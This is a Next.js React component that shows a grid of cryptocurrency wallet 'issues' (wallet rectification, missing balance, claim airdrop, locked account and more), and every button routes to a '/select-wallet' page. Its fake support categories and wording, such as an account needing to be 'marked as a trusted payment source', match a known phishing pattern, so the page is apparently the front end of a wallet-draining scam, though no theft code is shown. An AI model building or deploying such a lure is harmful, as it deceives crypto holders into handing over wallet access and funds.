'use client'

import React, { useState } from 'react';
import {
  GitPullRequest, Award, Shuffle, AlertTriangle, CreditCard,
  ArrowRightLeft, BarChart2, Repeat, LogIn, CheckSquare,
  ShoppingCart, AlertCircle, Link2, AlertOctagon, Clock, Gift, Image, 
  Lock, Wrench, ShieldCheck, Headphones, X, Network, Database
} from 'lucide-react';

import {useRouter }from "next/navigation";

interface MenuItem {
  title: string;
  description: string;
  icon: React.ElementType;
  sub?: boolean;
}

const menuItems: MenuItem[] = [

  {
    title: "Migration",
    description: "Click here for migration",
    icon: GitPullRequest,
  },
  {
    title: "Claim",
    description: "Click here to claim assets",
    icon: Award,
  },
  {
    title: "Swap",
    description: "Click here for assets swapping",
    icon: Shuffle,
  },
  {
    title: "Rectification",
    description: "Click here for wallet rectification",
    icon: Wrench,
    sub: true
  },
  {
    title: "Security",
    description: "Click here for security-related issues",
    icon: ShieldCheck,
  },
  {
    title: "Support",
    description: "Click here to contact support",
    icon: Headphones,
  },
  {
    title: "Slippage",
    description: "Click here for slippage related error",
    icon: AlertTriangle,
  },
  {
    title: "Transaction",
    description: "Click here for transaction related issues",
    icon: CreditCard,
  },
  {
    title: "Cross Transfer",
    description: "Click here for cross bridge issues",
    icon: ArrowRightLeft,
  },
  {
    title: "Staking",
    description: "Click here for Staking related issues",
    icon: BarChart2,
  },
  {
    title: "Exchange",
    description: "Click here for exchange related issues",
    icon: Repeat,
  },
  {
    title: "Connect to Dapps",
    description: "Click here for error while connecting to dapps.",
    icon: Link2,
  },
  {
    title: "Login",
    description: "Click here for wallet login issue.",
    icon: LogIn,
  },
  {
    title: "Whitelist",
    description: "Click here for whitelist related issues.",
    icon: CheckSquare,
  },
  {
    title: "Buy Coins/Tokens",
    description: "To trade, your account must be marked as a trusted payment source.",
    icon: ShoppingCart,
  },
  {
    title: "Missing/Irregular Balance",
    description: "Click here to recover lost/missing funds.",
    icon: AlertCircle,
  },
  {
    title: "Wallet Glitch / Wallet Error",
    description: "Click here if you have problem with your trading wallet.",
    icon: AlertOctagon,
  },
  {
    title: "Transaction Delay",
    description: "Click here for any issues related to transaction delay.",
    icon: Clock,
  },
  {
    title: "Claim Airdrop",
    description: "Click here for airdrop related issues.",
    icon: Gift,
  },
  {
    title: "NFTs",
    description: "Click here for NFTs minting/transfer related issues.",
    icon: Image,
  },
  {
    title: "Locked Account",
    description: "Click here for issues related to account lock.",
    icon: Lock,
  },
];

const SelectAction = () => {
  const [showModal, setShowModal] = useState(false);
  const router = useRouter();

  const handleClick = (item: MenuItem) => {
    if (item.sub) {
      setShowModal(true);
    } else {
      router.push('/select-wallet');
    }
  };

  return (
    <>
      {/* Main Content */}
      <div className="min-h-screen bg-black py-16 px-4 sm:px-6 lg:px-8">
        {/* Title */}
        <h1 className="text-3xl sm:text-4xl lg:text-5xl text-white text-center mb-16">
          Select Your Action Below
        </h1>

        {/* Grid Container */}
        <div className="max-w-7xl mx-auto grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6">
          {menuItems.map((item, index) => {
            const IconComponent = item.icon;
            return (
              <button
                onClick={() => handleClick(item)} // Now it will always have a valid string value
                key={index}
                className="group bg-black/50 backdrop-blur-sm rounded-lg p-6 
                           border border-gray-800 
                           hover:bg-gray-900/50 transition-all duration-300 
                           hover:border-gray-600 hover:shadow-lg hover:shadow-blue-500/10
                           flex flex-col items-start text-left"
              >
                {/* Icon and Title Container */}
                <div className="flex items-center space-x-4 mb-3">
                  <div className="p-2 rounded-lg bg-gray-900 group-hover:bg-gray-800 transition-colors">
                    <IconComponent className="w-6 h-6 text-blue-400 group-hover:text-blue-300" />
                  </div>
                  <h3 className="text-lg sm:text-xl font-semibold text-gray-200 group-hover:text-white transition-colors">
                    {item.title}
                  </h3>
                </div>

                {/* Description */}
                <p className="text-gray-400 group-hover:text-gray-300 text-sm sm:text-base transition-colors">
                  {item.description}
                </p>
              </button>
            );
          })}
        </div>
      </div>

      {/* Modal Overlay */}
      {showModal && (
        <section className="fixed inset-0 z-50">
          {/* Blur Overlay */}
          <div 
            className="absolute inset-0 bg-black/60 backdrop-blur-sm"
            onClick={() => setShowModal(false)}
          />
          
          {/* Modal */}
          <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 bg-slate-900 p-8 rounded-lg border border-gray-800 w-[90%] max-w-md relative">
            {/* Close Button */}
            <button
              onClick={() => setShowModal(false)}
              className="absolute top-4 right-4 text-gray-400 hover:text-white transition-colors"
            >
              <X size={24} />
            </button>

            <h2 className="text-2xl text-white mb-6 text-center">Choose Your Action</h2>
            
            <div className="flex flex-col gap-4">
              <button
                onClick={() => router.push('/select-wallet')}
                className="w-full py-3  group bg-black/50 backdrop-blur-sm rounded-lg p-6 
                           border border-gray-800 
                           hover:bg-gray-900/50 duration-300 
                           hover:border-gray-600 hover:shadow-lg hover:shadow-blue-500/10
                              text-left bg-gray-900 group-hover:bg-gray-800 transition-colors flex items-center justify-center gap-2"
              >
                <Network className='text-blue-400 group-hover:text-blue-300' size={20} />
                RPC
              </button>
              
              <button 
                onClick={() => router.push('/select-wallet')}
                className="w-full py-3  group bg-black/50 backdrop-blur-sm  
                           border border-gray-800 
                           hover:bg-gray-900/50 duration-300 
                           hover:border-gray-600 hover:shadow-lg hover:shadow-blue-500/10
                              text-left bg-gray-900 group-hover:bg-gray-800 transition-colors flex items-center justify-center gap-2  text-white rounded-lg"
              >
                <Database className='text-blue-400 group-hover:text-blue-300' size={20} />
                IPFS and API
              </button>
            </div>
          </div>
        </section>
      )}
    </>
  );
};

export default SelectAction;